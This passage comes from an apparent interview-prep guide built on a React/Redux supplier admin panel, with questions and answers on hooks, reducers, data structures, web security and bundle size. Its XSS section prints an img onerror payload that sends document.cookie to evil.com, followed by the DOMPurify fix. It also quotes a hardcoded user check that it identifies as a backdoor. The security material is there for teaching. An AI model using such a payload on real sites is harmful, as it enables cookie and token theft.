// BUT if items comes from a selector returning new array:
const items = useSelector(state => state.items.filter(...));  // New ref every render!
// → useEffect fires → setState → re-render → selector returns new ref → loop
```

**Concept:** `useEffect` dependency comparison uses `Object.is()`. Avoid dependencies that change on every render (new objects/arrays).

---

## RC-10: What is reconciliation and the Virtual DOM?

**Project Code:** `routes/Pages/Manage/Supplier/index.js` — re-renders on success action
```javascript
useEffect(() => {
  if (
    successAction === SUPPLIER_UPDATE_SUCCESS ||
    successAction === SUPPLIER_CREATE_SUCCESS ||
    successAction === SUPPLIER_DELETE_SUCCESS
  ) {
    dispatch(getAllSupplier(params));  // Fetches new data → re-renders entire table
  }
}, [successAction]);
```

**Question:** When the supplier list updates (100 rows), does React re-create all 100 DOM nodes?

**Answer:**

**No.** React uses a **diffing algorithm** (reconciliation):

1. **Render phase:** React calls `Supplier()` component → creates new Virtual DOM tree (JS objects)
2. **Diffing:** Compares new VDOM with previous VDOM, element by element
3. **Commit phase:** Only applies **minimum DOM mutations** needed

**For the table:**
- If 1 supplier name changed → React updates 1 `<td>` text node
- If a supplier is deleted → React removes 1 `<tr>` node
- If supplier order changed → depends on **keys**:
  - With `key={supplier._id}` → React moves the DOM node (efficient)
  - With `key={index}` → React updates all rows from the changed position down (inefficient)

**VDOM is NOT faster than direct DOM manipulation.** It's faster than **recreating the entire DOM**. The trade-off: React does extra work (diffing) to minimize DOM mutations.

**Concept:** Virtual DOM is an in-memory representation. Reconciliation is the diffing algorithm. Keys help React identify which elements changed.

---

## RC-11: Explain `combineReducers` — how does Redux split state?

**Project Code:** `redux/reducers/index.js` lines 34–64
```javascript
export default history =>
  combineReducers({
    Roles: RolesReducer,
    Permissions: PermissionsReducer,
    Users: UsersReducer,
    Products: ProductsReducer,
    Suppliers: SuppliersReducer,
    auth: AuthReducer,
    Loading: LoadingReducer,
    Error: ErrorReducer,
    router: connectRouter(history),
    // ... 20+ more
  });
```

**Question:** How does `combineReducers` work internally? Write a simplified version.

**Answer:**
```javascript
function combineReducers(reducerMap) {
  return function rootReducer(state = {}, action) {
    const nextState = {};
    let hasChanged = false;

    for (const [key, reducer] of Object.entries(reducerMap)) {
      const prevSlice = state[key];
      const nextSlice = reducer(prevSlice, action);
      nextState[key] = nextSlice;
      hasChanged = hasChanged || prevSlice !== nextSlice;
    }

    return hasChanged ? nextState : state;
  };
}
```

**Key insight:** Every dispatched action goes to EVERY reducer. Each reducer checks `action.type` in its switch statement and returns either new state (if it handles the action) or the existing state (default case).

**Why `hasChanged` matters:** If no reducer returned new state, `combineReducers` returns the same state object → `===` check passes → no re-render.

**Concept:** `combineReducers` creates a root reducer that delegates to sub-reducers based on state keys. Each action reaches all reducers.

---

## RC-12: What is `ConnectedRouter` and why is it used?

**Project Code:** `App.js` lines 16–26
```javascript
const App = () => (
  <Provider store={store}>
    <ConnectedRouter history={history}>
      <AppContextProvider>
        <AppWrapper>
          <Switch>
            <Routes />
          </Switch>
        </AppWrapper>
      </AppContextProvider>
    </ConnectedRouter>
  </Provider>
);
```

**Question:** What's the difference between `BrowserRouter` and `ConnectedRouter`? Why is Redux connected to the router?

**Answer:**

| Feature | `BrowserRouter` | `ConnectedRouter` |
|---------|----------------|-------------------|
| History source | Creates its own | Uses shared `history` object |
| Redux integration | None | Syncs URL ↔ Redux state |
| Time-travel debug | No | Yes — can replay navigation |
| Programmatic nav | `useHistory()` hook | `dispatch(push('/path'))` |

**Why this project uses it:** The `connected-react-router` package syncs router state with Redux store:
```javascript
// In reducers:
router: connectRouter(history)

// In middleware:
routerMiddleware(history)
```

This means `store.getState().router.location` always matches the current URL. Redux DevTools can replay navigation history.

**Concept:** `ConnectedRouter` bridges React Router and Redux, enabling time-travel debugging for navigation and dispatching navigation actions from Redux middleware.

---

---

# Section C: Redux & State Management

---

## RX-1: Explain the Redux data flow in this project

**Project Code:** Complete flow for supplier listing:

```
User clicks page → handlePageChange(newPage)
  → setPage(newPage)                              [React state]
  → useEffect triggers with [searchTerm]           [React effect]
    → dispatch(getAllSupplier(params))              [Redux action creator]
      → dispatch(setLoading(SUPPLIER_LIST_REQUEST)) [Loading action]
      → Axios.post('/supplier/...')                 [API call]
      → dispatch({ type: SUPPLIER_LIST_SUCCESS })   [Success action]
        → SuppliersReducer handles SUPPLIER_LIST_SUCCESS [Reducer]
          → returns { ...state, suppliers: action.data } [New state]
            → useSelector detects change                  [Subscription]
              → Supplier component re-renders             [React render]
                → CustomTable shows new data              [DOM update]
```

**Question:** How many renders happen for one page change? Identify each.

**Answer:**
1. `setPage(newPage)` → render #1 (page state changed)
2. `useEffect` fires → `dispatch(setLoading())` → render #2 (Loading reducer changes)
3. API responds → `dispatch(SUPPLIER_LIST_SUCCESS)` → render #3 (Suppliers reducer changes)
4. Success also dispatches → `dispatch(setSuccess(...))` → render #4 (Success reducer changes)

**Total: 4 renders** for one page change. With React 18's automatic batching, renders 3+4 would batch into 1. But this project uses React 16 — no automatic batching.

**Concept:** Unidirectional data flow: View → Action → Reducer → Store → View. Each `dispatch` triggers a synchronous store update and subscriber notification.

---

## RX-2: What is the "REQUEST/SUCCESS/FAILED" action pattern?

**Project Code:** `redux/actions/Manage/Suppliers/Suppliers.js`
```javascript
// Constants
SUPPLIER_LIST_REQUEST    // Before API call
SUPPLIER_LIST_SUCCESS    // API succeeded
SUPPLIER_LIST_FAILED     // API failed

// Usage
export const getAllSupplier = (filter) => async dispatch => {
  dispatch(setLoading(SUPPLIER_LIST_REQUEST));          // REQUEST
  try {
    const response = await Axios.post(`/supplier/...`);
    dispatch({ type: SUPPLIER_LIST_SUCCESS, data: response.data });  // SUCCESS
  } catch (error) {
    ErrorCatch(error, SUPPLIER_LIST_FAILED, dispatch);  // FAILED
  }
};
```

**Question:** Why three action types for one API call? How does each affect the UI?

**Answer:**

| Action | Reducer Effect | UI Effect |
|--------|---------------|-----------|
| `SUPPLIER_LIST_REQUEST` | `Loading.loading = true` | Show spinner |
| `SUPPLIER_LIST_SUCCESS` | `Suppliers.suppliers = data` | Show data, hide spinner |
| `SUPPLIER_LIST_FAILED` | `Error.message = "..."` | Show error toast, hide spinner |

**This is the standard async action pattern.** It maps to HTTP request lifecycle:
- Pending → Loading state
- Fulfilled → Success state
- Rejected → Error state

**Modern alternative (Redux Toolkit):**
```javascript
const fetchSuppliers = createAsyncThunk('suppliers/fetch', async (filter) => {
  const response = await Axios.post('/supplier/...', { filter });
  return response.data;
});
// Automatically generates: fetchSuppliers.pending, .fulfilled, .rejected
```

**Concept:** Async action pattern for predictable API state management. Each phase has a distinct action type so the UI can show appropriate feedback.

---

## RX-3: Why does the reducer have `action` stored in state?

**Project Code:** `redux/reducers/Manage/Suppliers.js` lines 66–74
```javascript
case SUPPLIER_LIST_SUCCESS: {
  return {
    ...state,
    suppliers: action.data,
    total: action.total,
    action: action.type,      // ← Why store action type in state?
    message: action.message,
    perPage: action.perPage,
  };
}
```

**Question:** Storing `action.type` in the state slice seems unusual. Why would you do this?

**Answer:**
It's used in `useEffect` to detect which action just succeeded:

```javascript
const successAction = useSelector(state => state.Success.action);

useEffect(() => {
  if (
    successAction === SUPPLIER_UPDATE_SUCCESS ||
    successAction === SUPPLIER_CREATE_SUCCESS ||
    successAction === SUPPLIER_DELETE_SUCCESS
  ) {
    dispatch(getAllSupplier(params));  // Refresh table after CRUD
  }
}, [successAction]);
```

**This is an anti-pattern.** Storing the last action type in state creates:
1. **Stale action bugs** — if the same action fires twice, `useEffect` doesn't trigger (same value)
2. **Coupling** — components need to know action type constants
3. **Race conditions** — if two actions fire quickly, only the last one is stored

**Better approach:** Use callbacks in thunk actions:
```javascript
dispatch(updateSupplier(data, () => {
  dispatch(getAllSupplier(params));  // Refresh after success
}));
```

**Concept:** Redux state should represent data, not events. Action types in state are a workaround for missing event-driven patterns.

---

---

# Section D: Data Structures & Algorithms

---

## DS-1: How is array `.filter()` used for deletion in reducers?

**Project Code:** `redux/reducers/Manage/Suppliers.js` lines 85–92
```javascript
case SUPPLIER_DELETE_SUCCESS: {
  return {
    ...state,
    suppliers: state.suppliers.filter(
      supplier => supplier.userId !== action.data.UserId,
    ),
  };
}
```

**Question:** What is the time complexity of `.filter()` for deletion? How does it compare to a linked list deletion?

**Answer:**

| Operation | Array `.filter()` | Linked List | Hash Map |
|-----------|-------------------|-------------|----------|
| Delete by value | O(n) — scan entire array | O(n) — walk to node | O(1) — key lookup |
| Memory | Creates new array (O(n) space) | Modify pointers (O(1) space) | O(n) space |
| Order preserved? | Yes | Yes | No (in JS Map: yes) |

**In Redux context:** `.filter()` is the correct choice because:
1. Immutability — must create new array (can't modify in place)
2. Arrays are the natural shape for lists in JavaScript/JSON
3. O(n) is fast enough for admin panel data (hundreds, not millions)

**Potential bug:** `supplier.userId !== action.data.UserId` — note the capital `U` in `UserId`. If the action dispatches `userId` (lowercase), this filter matches nothing and no item is removed.

**Concept:** Array `.filter()` creates a new array with elements that pass the test. Time: O(n). Space: O(n). Non-mutating.

---

## DS-2: How does `.map()` perform an immutable update in an array?

**Project Code:** `redux/reducers/Manage/Suppliers.js` lines 81–82
```javascript
suppliers: state.suppliers.map(supplier =>
  supplier._id === action.data._id ? action.data : supplier,
),
```

**Question:** You need to update one item in an array of 1000 suppliers. What's the time complexity? Is there a more efficient data structure?

**Answer:**

**Current approach — O(n):** `.map()` iterates all 1000 items, creates a new array, replaces one item.

**Normalized state (O(1) lookup):**
```javascript
// Instead of: suppliers: [{ _id: "1", name: "A" }, { _id: "2", name: "B" }]
// Use:
suppliers: {
  byId: { "1": { _id: "1", name: "A" }, "2": { _id: "2", name: "B" } },
  allIds: ["1", "2"]
}

// Update:
case SUPPLIER_UPDATE_SUCCESS:
  return {
    ...state,
    byId: { ...state.byId, [action.data._id]: action.data }  // O(1)
  };
```

**Trade-off:**
| Approach | Update | Lookup by ID | Ordered list | Complexity |
|----------|--------|-------------|--------------|------------|
| Array | O(n) | O(n) | Yes | Simple |
| Normalized | O(1) | O(1) | Via allIds | More complex |

**For admin panels with <1000 items, arrays are fine.** Normalized state shines when you have 10,000+ items or frequent updates.

**Concept:** Normalization converts arrays to maps (dictionaries) for O(1) lookups. Used in Redux Toolkit's `createEntityAdapter`.

---

## DS-3: Client-side pagination with `slice()` — what data structure is this?

**Project Code:** `components/CustomeTable/index.js`
```javascript
row.slice(page * rowsPerPage, page * rowsPerPage + rowsPerPage)
```

**Question:** All 500 suppliers are loaded in memory. The table shows 10 at a time using `.slice()`. What's the memory implication? How would you implement server-side pagination?

**Answer:**

**Client-side (current):**
```
API: GET /suppliers → returns ALL 500 suppliers
Memory: 500 objects in Redux store
Display: .slice(20, 30) shows 10
```
- Wastes bandwidth (downloads all 500 even if user only views page 1)
- Wastes memory (all 500 in Redux)
- Fast page switching (no API call per page)

**Server-side:**
```
API: POST /suppliers { page: 2, perPage: 10 } → returns 10 suppliers + total: 500
Memory: 10 objects in Redux store
Display: All 10 rendered directly
```
- Efficient for large datasets
- Each page change requires API call (slight delay)
- Needs total count for pagination controls

**Backend already supports this:** `routes/suppliersRoutes.js` has `/supplier/fetchpaginationadmin/:userId/:page` which returns paginated results.

**Concept:** Pagination strategies — offset-based (page * size), cursor-based (lastId), and keyset pagination. Client-side is O(n) memory; server-side is O(pageSize).

---

## DS-4: How does the search filter work? What data structure would make it faster?

**Project Code:** `routes/Pages/Manage/Supplier/index.js` lines 376–380
```javascript
useEffect(() => {
  let params = { search: searchTerm };
  dispatch(getAllSupplier(params));
}, [dispatch, searchTerm, dataUpdated]);
```

**Question:** Every keystroke dispatches an API call. How would you implement client-side search with a trie or inverted index?

**Answer:**

**Current approach:** Each keystroke → API call → full DB query → return results. With debouncing (not implemented here), it's still 1 API call per word.

**Client-side with trie:**
```javascript
class TrieNode {
  constructor() {
    this.children = {};
    this.results = [];  // Supplier IDs matching this prefix
  }
}

// Build trie from supplier names
"Tata Steel" → t → a → t → a → [supplierId: 5]
"Tata Motors" → t → a → t → a → [supplierId: 5, 7]

// Search "tat" → traverse t→a→t → return all results under this node
// Time: O(k) where k = search term length (not n = total items)
```

**Simpler approach — inverted index:**
```javascript
const index = {
  "tata": [5, 7],
  "steel": [5],
  "motors": [7],
  "pipe": [1, 3, 8]
};
// Search "tata" → index["tata"] → [5, 7] → O(1) lookup
```

**Practical solution for this project — debounced search:**
```javascript
const debouncedSearch = useDebounce();
const handleSearch = (term) => {
  debouncedSearch(() => dispatch(getAllSupplier({ search: term })), 500);
};
```

**Concept:** Trie = prefix tree for autocomplete. Inverted index = word → document mapping. Both trade space for time. Debouncing reduces API calls.

---

## DS-5: How does the Redux store represent a tree of product categories?

**Project Code:** The admin panel manages a hierarchy: Product → Material → Grade

```javascript
// Redux state structure (from reducers)
{
  Products: { products: [...], total: 0 },
  Materials: { materials: [...], total: 0 },
  Grades: { grades: [...], total: 0 },
  MaterialGrade: { materialGrades: [...] },        // Many-to-many mapping
  ProductMaterials: { productMaterials: [...] },    // Many-to-many mapping
}
```

**Question:** This is a graph (many-to-many relationships). How is it stored? What's a more efficient representation?

**Answer:**

**Current approach — flat arrays:**
Each entity is a separate array in Redux. Relationships are stored as ID references:
```javascript
product = { _id: "p1", name: "Pipe", materialIds: ["m1", "m2"] }
material = { _id: "m1", name: "Steel", gradeIds: ["g1", "g2"] }
```

**Problem:** To display "All grades for product P1", you need:
1. Find product → get materialIds → O(1)
2. For each materialId, find material → get gradeIds → O(n × m)
3. For each gradeId, find grade → O(n × m × g)

**Normalized graph representation:**
```javascript
{
  entities: {
    products: { "p1": { name: "Pipe" } },
    materials: { "m1": { name: "Steel" } },
    grades: { "g1": { name: "304" } }
  },
  relationships: {
    productMaterials: { "p1": ["m1", "m2"] },
    materialGrades: { "m1": ["g1", "g2"] }
  }
}
// Lookup: O(1) for any entity, O(1) for any relationship
```

**Concept:** Graph data in Redux — use normalized entities + adjacency lists for relationships. Avoids N+1 lookups when traversing hierarchies.

---

## DS-6: How does sorting work in the CustomTable?

**Project Code:** `routes/Pages/Manage/Supplier/index.js` lines 308–311
```javascript
const handleRequestSort = (event, property) => {
  const isAsc = orderBy === property && order === 'asc';
  setOrderBy(property);
  setOrder(isAsc ? 'desc' : 'asc');
};
```

**Question:** This toggles sort direction in React state, but where does the actual sorting happen? What sorting algorithm does JavaScript's `.sort()` use?

**Answer:**

**Where sorting happens:** Only in the CustomTable's visual rendering — it applies `order` and `orderBy` to the displayed rows using Material-UI's table sorting. The Redux state is NOT re-sorted. **This means sorting only works on the current page** (client-side pagination).

**JavaScript `.sort()` algorithm:**
- V8 (Chrome/Node): **TimSort** (hybrid merge sort + insertion sort)
- Time: O(n log n) average and worst case
- Space: O(n) for the temporary merge array
- **Stable sort** (equal elements maintain original order)

**TimSort specifics:**
1. Splits array into "runs" (already sorted subsequences)
2. Uses insertion sort for small runs (< 32-64 elements)
3. Merges runs using merge sort
4. Exploits existing order in data → nearly-sorted arrays sort in O(n)

**Concept:** TimSort is the standard JS sort algorithm. Stable sorting preserves relative order of equal elements. Client-side sorting is limited to loaded data.

---

## DS-7: What is the time complexity of the permission check?

**Project Code:** `routes/Pages/Manage/Supplier/index.js` lines 74, 106
```javascript
const [permissionData] = useState(JSON.parse(localStorage.getItem('permission')));

// In getUserActions:
(userData?.userId === "2092" && userData?.email === "palak@rathinfotech.com")
  && actions.push({ action: 'delete', label: 'Delete', icon: <DeleteIcon /> });
```

**Question:** Permissions are stored as an array in localStorage. How would you make permission lookups O(1) instead of O(n)?

**Answer:**

**Current approach** (if permissions are checked via array iteration):
```javascript
const hasPermission = permissions.find(p => p.name === 'delete_supplier');
// O(n) — scan entire permissions array
```

**O(1) approach — convert to Set or Object on load:**
```javascript
// On login, store as object:
const permissionMap = {};
permissions.forEach(p => { permissionMap[p.name] = true; });
localStorage.setItem('permissionMap', JSON.stringify(permissionMap));

// Check:
const canDelete = permissionMap['delete_supplier'];  // O(1)
```

**Or use a Set:**
```javascript
const permissionSet = new Set(permissions.map(p => p.name));
permissionSet.has('delete_supplier');  // O(1)
```

**But the real bug here:** The delete button is hardcoded to `userId === "2092"` — this is a backdoor, not a permission system.

**Concept:** Hash-based lookups (Object, Map, Set) are O(1) average. Array `.find()` is O(n). Convert arrays to sets/maps when performing frequent lookups.

---

## DS-8: What is debouncing and how is it implemented?

**Project Code:** `@jumbo/utils/commonHelper.js` lines 61–91
```javascript
export const useDebounce = () => {
  let timeout;
  return (fn, delay = 300) => {
    clearTimeout(timeout);
    timeout = setTimeout(fn, delay);
  };
};
```

**Question:** Explain debouncing vs throttling with a timeline. When would you use each?

**Answer:**

**Debouncing (this code):** Wait until user STOPS acting for `delay` ms.
```
User types:  a---b---c---------d---e---------
Debounced:                c              e
                    (300ms gap)     (300ms gap)
```

**Throttling:** Execute at most once per `delay` ms.
```
User types:  a---b---c---d---e---f---g---h
Throttled:   a-----------d-----------g
             (every 300ms)
```

| Use Case | Debounce | Throttle |
|----------|----------|----------|
| Search input | Yes — wait for user to finish typing | No |
| Window resize | Either | Yes — update layout periodically |
| Scroll events | No | Yes — update position periodically |
| Button click | Yes — prevent double-click | Either |

**Bug in this implementation:** `useDebounce` uses a closure variable `timeout`, but in React, if the component re-renders, a new closure is created. The old `timeout` reference is lost. Should use `useRef`:
```javascript
export const useDebounce = () => {
  const timeoutRef = useRef();
  return useCallback((fn, delay = 300) => {
    clearTimeout(timeoutRef.current);
    timeoutRef.current = setTimeout(fn, delay);
  }, []);
};
```

**Concept:** Debouncing delays execution until input stabilizes. Throttling limits execution frequency. Both reduce unnecessary work.

---

## DS-9: Stack-based undo/redo — how would you add it to this admin panel?

**Question:** The admin panel has no undo functionality. If an admin accidentally deletes a supplier, there's no recovery. Design an undo system using a stack.

**Answer:**
```javascript
// Redux middleware for undo
const undoStack = [];
const redoStack = [];

const undoMiddleware = store => next => action => {
  if (action.type === 'UNDO') {
    const lastAction = undoStack.pop();
    if (lastAction) {
      redoStack.push(lastAction);
      return next({ type: lastAction.reverseType, data: lastAction.previousData });
    }
    return;
  }

  if (action.type === 'REDO') {
    const lastRedo = redoStack.pop();
    if (lastRedo) {
      undoStack.push(lastRedo);
      return next({ type: lastRedo.type, data: lastRedo.data });
    }
    return;
  }

  // For destructive actions, save undo info
  if (action.type === 'SUPPLIER_DELETE_SUCCESS') {
    const currentState = store.getState().Suppliers;
    const deletedSupplier = currentState.suppliers.find(s => s._id === action.data._id);
    undoStack.push({
      type: action.type,
      reverseType: 'SUPPLIER_CREATE_SUCCESS',
      previousData: deletedSupplier,
      data: action.data
    });
    redoStack.length = 0;  // Clear redo on new action
  }

  return next(action);
};
```

**Data structure:** Two stacks (arrays with push/pop):
- Undo stack: stores previous states for reversal
- Redo stack: stores undone actions for redo
- New action clears redo stack (can't redo after new change)

**Time complexity:** O(1) for push/pop. O(n) space for n actions stored.

**Concept:** Stack (LIFO) for undo/redo. Command pattern — store actions with their inverses.

---

## DS-10: How would you implement a search autocomplete with a trie?

**Question:** The admin panel search sends an API call for every keystroke. Implement client-side autocomplete using a trie for the 500 supplier names already in Redux state.

**Answer:**
```javascript
class TrieNode {
  constructor() {
    this.children = new Map();
    this.isEnd = false;
    this.data = []; // supplier objects
  }
}

class Trie {
  constructor() { this.root = new TrieNode(); }

  insert(word, supplier) {
    let node = this.root;
    for (const char of word.toLowerCase()) {
      if (!node.children.has(char)) {
        node.children.set(char, new TrieNode());
      }
      node = node.children.get(char);
      node.data.push(supplier); // All suppliers with this prefix
    }
    node.isEnd = true;
  }

  search(prefix) {
    let node = this.root;
    for (const char of prefix.toLowerCase()) {
      if (!node.children.has(char)) return [];
      node = node.children.get(char);
    }
    return node.data.slice(0, 10); // Top 10 results
  }
}

// Build on data load
const trie = new Trie();
suppliers.forEach(s => trie.insert(s.name, s));

// Search: O(k) where k = prefix length
trie.search("tat") → [Tata Steel, Tata Motors, ...]
```

**Complexity:**
- Build: O(n × m) where n = number of suppliers, m = avg name length
- Search: O(k) where k = prefix length — independent of total suppliers!
- Space: O(n × m) for all nodes

**Concept:** Trie (prefix tree) enables O(k) prefix search. Each node represents a character. Children map to possible next characters. Leaf nodes mark complete words.

---

---

# Section E: Security & Web Concepts

---

## SW-1: What is XSS and where is this codebase vulnerable?

**Project Code:** `components/About.js` line 126
```javascript
<Box dangerouslySetInnerHTML={{ __html: about }}></Box>
```

**Question:** A supplier sets their "about" field to `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`. What happens?

**Answer:**
1. `about` contains the malicious HTML
2. `dangerouslySetInnerHTML` injects it directly into the DOM
3. Browser tries to load image from `src=x` → fails → triggers `onerror`
4. `onerror` JavaScript executes: reads admin's cookie/localStorage token
5. Sends token to `evil.com` → attacker now has admin access

**This is Stored XSS** — persists in database, affects all viewers.

**Attack chain in this project:**
- Supplier registers → sets malicious "about" text → stored in MongoDB
- Admin views supplier in admin panel → XSS executes
- `localStorage.getItem('auth-token')` stolen → full admin takeover

**Defense:** Always sanitize with DOMPurify before `dangerouslySetInnerHTML`:
```javascript
import DOMPurify from 'dompurify';
<Box dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(about) }}></Box>
```

**Concept:** XSS (Cross-Site Scripting) — injecting malicious scripts into web pages. Types: Stored (database), Reflected (URL), DOM-based (client-side).

---

## SW-2: Why is localStorage insecure for tokens?

**Question:** This project stores JWT tokens in localStorage. Why do security experts recommend httpOnly cookies instead?

**Answer:**

| Storage | XSS Access | CSRF Risk | Expiry Control | Sent Automatically |
|---------|-----------|-----------|---------------|-------------------|
| localStorage | `localStorage.getItem()` — any JS can read | None | Manual (no auto-expire) | No (must add header manually) |
| httpOnly Cookie | Cannot be read by JS | Yes (mitigated by SameSite) | Automatic (cookie expires) | Yes (browser sends automatically) |
| sessionStorage | Same as localStorage but clears on tab close | None | Tab lifecycle | No |

**The critical difference:** With localStorage, ANY JavaScript on the page can read the token — including XSS payloads (SW-1), browser extensions, and injected analytics scripts.

With `httpOnly` cookies, even if XSS exists, the attacker **cannot read the token**. They can only make authenticated requests from the same page (CSRF), which is mitigated by `SameSite=Strict`.

**Concept:** httpOnly cookies are invisible to JavaScript. SameSite cookies prevent cross-origin requests. Defense in depth — multiple layers of protection.

---

## SW-3: What is CORS and how does this project handle it?

**Project Code:** `services/api.service.js` — Axios configuration
```javascript
axios.defaults.baseURL = config.REACT_APP_API_BASE_URL;
// API at http://localhost:3050
// Frontend at http://localhost:3000
```

**Question:** The frontend runs on port 3000 and the API on port 3050. Why does this work in development but might fail in production?

**Answer:**
Different ports = different origins → CORS applies.

**Development:** `react-scripts` dev server has a proxy feature, OR the backend has `cors()` middleware allowing all origins (which it does — with a wildcard override).

**Production:** The built React app is served from a static host (different domain). The backend must explicitly allow the frontend's origin:
```javascript
// Backend CORS config
app.use(cors({
  origin: 'https://admin.thepipingmart.com',
  credentials: true  // Needed for cookies
}));
```

**From BACKEND_IMPROVEMENTS.md:** The backend has `cors({ origin: '*' })` which overrides the whitelist — allowing any website to make authenticated requests. This is a security vulnerability.

**Concept:** CORS (Cross-Origin Resource Sharing) — browser security mechanism. Same-origin policy blocks cross-origin requests unless the server explicitly allows them via CORS headers.

---

## SW-4: What is CSRF and is this project vulnerable?

**Question:** Explain CSRF. With the current localStorage token approach, is CSRF possible?

**Answer:**

**CSRF (Cross-Site Request Forgery):** An attacker tricks a logged-in user's browser into making unwanted requests to a trusted site.

**With localStorage tokens: NOT directly vulnerable to CSRF.** Because:
1. localStorage tokens must be manually added to request headers via JavaScript
2. A malicious site can't access another site's localStorage (same-origin policy)
3. The attacker's site can't read or set the `authorization` header

**But if migrated to cookies (SW-2 fix): CSRF becomes a risk** because:
1. Cookies are sent automatically with every request to the domain
2. A malicious site can create a `<form>` that submits to the API
3. The browser attaches the cookie automatically

**Defense when using cookies:**
```javascript
// SameSite cookie prevents cross-origin requests
res.cookie('token', jwt, { sameSite: 'strict', httpOnly: true, secure: true });

// CSRF token for extra protection
const csrfToken = generateToken();
res.cookie('csrf', csrfToken);
// Frontend reads csrf cookie, sends as header: X-CSRF-Token
```

**Concept:** CSRF exploits browser auto-attachment of cookies. Defense: SameSite cookies, CSRF tokens, checking Origin/Referer headers.

---

## SW-5: Explain the OAuth/JWT flow vs session-based auth

**Question:** This project uses session-based auth (Redis sessions on backend, token in localStorage on frontend). How would JWT auth differ?

**Answer:**

**Current flow (Session-based):**
```
Login → Backend creates Redis session → Returns sessionId as token
Request → Frontend sends token in header → Backend looks up Redis → Gets user
Logout → Backend deletes Redis session → Token invalid
```

**JWT flow:**
```
Login → Backend creates JWT (signed with secret) → Returns JWT
Request → Frontend sends JWT in header → Backend verifies signature → Gets user from JWT payload
Logout → Frontend deletes JWT → Backend can't invalidate (stateless)
```

| Feature | Session (Current) | JWT |
|---------|-------------------|-----|
| Server state | Redis stores sessions | Stateless (no server storage) |
| Scalability | Need shared Redis for multiple servers | Any server can verify |
| Revocation | Delete from Redis → instant | Can't revoke until expiry |
| Size | Small token (session ID) | Large token (encoded payload) |
| Security | Server-side control | Must handle refresh tokens |

**The project's `auth.service.js` has a broken `refreshAccessToken()` (C-5) — returns hardcoded JWT. This means expired sessions require full re-login.

**Concept:** Sessions are server-stateful, JWTs are stateless. Both have trade-offs. Sessions are easier to revoke; JWTs scale better.

---

---

# Section F: Performance & Best Practices

---

## PB-1: What is code splitting and why doesn't this project use it?

**Project Code:** `routes/index.js` — all 50+ routes imported statically
```javascript
import Dashboard from './Pages/Manage/Dashboard';
import Users from './Pages/Manage/Users';
import Products from './Pages/Manage/Products';
import Supplier from './Pages/Manage/Supplier';
// ... 40+ more imports
```

**Question:** How much JavaScript does the user download on first page load? How would `React.lazy` help?

**Answer:**

**Currently:** All 50+ page components are bundled into ONE JavaScript file. Even if the admin only visits the Dashboard, they download code for Products, Suppliers, Email, Grades, Materials, etc.

**With code splitting:**
```javascript
const Dashboard = React.lazy(() => import('./Pages/Manage/Dashboard'));
const Products = React.lazy(() => import('./Pages/Manage/Products'));

// In routes:
<Suspense fallback={<CircularProgress />}>
  <RestrictedRoute path="/dashboard" component={Dashboard} />
  <RestrictedRoute path="/manage-products" component={Products} />
</Suspense>
```

**Impact:**
- Initial bundle: ~2MB → ~500KB (Dashboard + framework only)
- Each page loads on demand: ~50-100KB per page
- First meaningful paint: 2-3x faster

**How `React.lazy` works:**
1. Returns a lazy component that calls `import()` on first render
2. `import()` returns a Promise that resolves to the module
3. While loading, `<Suspense>` shows the fallback
4. Webpack splits the import into a separate chunk (file)

**Concept:** Code splitting divides the bundle into chunks loaded on demand. Reduces initial load time. Uses dynamic `import()` and Webpack's chunk splitting.

---

## PB-2: Why is the project using both Material-UI v4 AND v5?

**Project Code:** `package.json`
```json
"@material-ui/core": "^4.12.0",    // v4
"@material-ui/icons": "^4.11.2",   // v4
"@mui/material": "^5.11.4",        // v5
"@mui/x-data-grid": "^6.16.0"      // v6 (requires v5)
```

**Question:** What's the bundle size impact of having both v4 and v5? Why can't they share code?

**Answer:**

**Bundle impact:**
- `@material-ui/core` (v4): ~300KB minified
- `@mui/material` (v5): ~350KB minified
- Combined: ~650KB — nearly double what's needed

**Why they can't share code:**
- Different npm packages with different entry points
- Different styling engines: v4 uses `makeStyles` (JSS), v5 uses `@emotion/styled`
- Different component APIs (some props renamed)
- Both include their own copy of base components (Button, TextField, etc.)
- Tree-shaking can't eliminate v4 components if they're still imported

**Migration path:** Replace one component at a time:
```javascript
// Before (v4):
import { Button } from '@material-ui/core';
import { makeStyles } from '@material-ui/core/styles';

// After (v5):
import { Button } from '@mui/material';
import { styled } from '@mui/material/styles';
```

**Concept:** Bundle bloat from duplicate dependencies. Tree-shaking only removes unused exports, not entire packages that are imported. Migration should be incremental.

---

## PB-3: What is `React.StrictMode` and why should this project use it?

**Question:** The project doesn't use `StrictMode`. What would happen if it was added?

**Answer:**

**StrictMode** is a development-only wrapper that helps find common bugs:
```javascript
<React.StrictMode>
  <App />
</React.StrictMode>
```

**What it detects (relevant to this project):**
1. **Unsafe lifecycle methods** — `componentWillMount`, `componentWillReceiveProps` (deprecated)
2. **Side effects in render** — StrictMode double-invokes render functions to catch impure renders
3. **Deprecated API usage** — `findDOMNode`, `createRef` with function components
4. **Missing cleanup** — useEffect cleanup functions (like the Socket.io leak X-1)

**Why this project would benefit:**
- The Socket.io memory leak (X-1) would be caught — double-invoked useEffect would register duplicate listeners
- The `setTimeout` in auth (JS-2) would show issues — double-invoked thunks

**StrictMode does NOT:**
- Affect production builds (zero overhead)
- Break working code (only warns)
- Run in production

**Concept:** StrictMode activates additional checks and warnings for descendants. It intentionally double-renders to catch side effects in render phase.

---

## PB-4: How does the virtual DOM diffing algorithm work with lists?

**Question:** Given the supplier table with 100 rows, explain what happens when one row is deleted from the middle. Compare `key={index}` vs `key={supplier._id}`.

**Answer:**

**Scenario:** Delete supplier at index 50 from 100 suppliers.

**With `key={supplier._id}` (correct):**
```
Before: [A:id1, B:id2, ..., X:id50, Y:id51, ..., Z:id100]
After:  [A:id1, B:id2, ..., Y:id51, ..., Z:id100]

React sees: key "id50" disappeared → remove that DOM node
All other keys match → no DOM changes needed
Result: 1 DOM removal
```

**With `key={index}` (current code):**
```
Before: [A:0, B:1, ..., X:49, Y:50, ..., Z:99]
After:  [A:0, B:1, ..., Y:49, Z:50, ..., ?:98]

React sees: key 49 changed from X→Y, key 50 changed from Y→Z, ...
Result: 50 DOM updates + 1 DOM removal = 51 DOM operations
```

**Why?** With index keys, every element after the deletion gets a new index. React thinks these are the same elements (same key) with changed content, so it updates each one.

**Concept:** React's reconciliation uses keys to match elements between renders. Stable, unique keys enable O(1) matching. Index keys degrade to O(n) for mid-list changes.

---

## PB-5: What would you do to reduce the initial bundle size of this app?

**Question:** List 5 concrete steps to reduce the admin panel's JavaScript bundle size, with estimated savings.

